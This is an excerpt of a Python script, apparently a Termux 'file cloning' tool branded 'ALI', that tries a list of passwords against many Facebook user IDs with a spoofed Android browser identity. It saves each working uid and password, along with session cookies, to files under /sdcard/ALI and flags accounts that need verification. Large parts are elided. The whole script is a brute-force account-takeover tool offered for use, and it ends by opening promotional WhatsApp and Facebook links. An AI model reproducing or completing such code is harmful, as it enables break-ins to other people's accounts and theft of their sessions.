...
class System:
    ...
    def menu(self):
        try:
            os.makedirs('/sdcard/ALI')
        except:
            pass
        os.system('clear')
        print(self.logo)
        print(f' ({green}1{reset}) File Cloning')
        print(f' ({green}2{reset}) WhatsApp Group (ALI)')
        print(47 * '-')
        select = input(f' Select: ')
        if select == '1':
            self.file_clone()
        else:
            os.system('xdg-open https://chat.whatsapp.com/IFKZA2yktGdFe9FDX7MAuu')
            exit()
    ...
    def cloning_process(self):
        os.system('clear')
        print(logo)
        print(f' ({green}•{reset}) Accounts save in /sdcard/ALI')
        print(47*'-')
    ...
    def cloning(self,uid,first,last):
        ...
        fbbd = 'Samsung'
        user_agent = f"Mozilla/5.0 (Linux; U; Android 2.2.1; fr-fr; Desire HD Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1" \
        ...
        for pw in self.passwords:
            try:
                ...
                if "session_key" in response:
                    ...
                    print(f'\r{greenn} [ALI-OK] {uid} | {pw} {reset}')
                    open('/sdcard/ALI/ali-ok-with-cookies.txt','a').write(str(uid_pw))
                    open('/sdcard/ALI/ali-ok.txt','a').write(f'{uid}|{pw}\n')
                    self.oku.append(uid)
                    break
                elif "User must verify their account" in response:
                    print(f'\r{blue} [ALI-CP] {uid} | {pw} {reset}')
                    open('/sdcard/ALI/ali-cp.txt','a').write(f'{uid}|{pw}\n')
                    self.cpu.append(uid)
                    break
                else:
                    continue
...
if __name__ == "__main__":
    ...
    os.system('xdg-open https://www.facebook.com/profile.php?id=100087982603028&mibextid=ZbWKwL')
    #time.sleep(5)
    logo = f'''
